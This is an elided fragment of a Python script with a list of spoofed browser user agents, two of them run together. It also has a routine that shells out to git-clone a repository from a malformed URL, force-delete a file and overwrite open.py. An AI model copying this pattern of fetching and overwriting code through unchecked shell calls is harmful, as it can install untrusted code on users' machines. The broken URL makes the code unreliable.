...
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 9; TECNO KC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 11; TECNO KF7j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 )", ""];useragent_url=(user_agent[2])
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github/DARLIHOT/best.git")
			os.system("rm -rf DARLIHOT/open.py")
			os.system("cp -f open.py \\.")
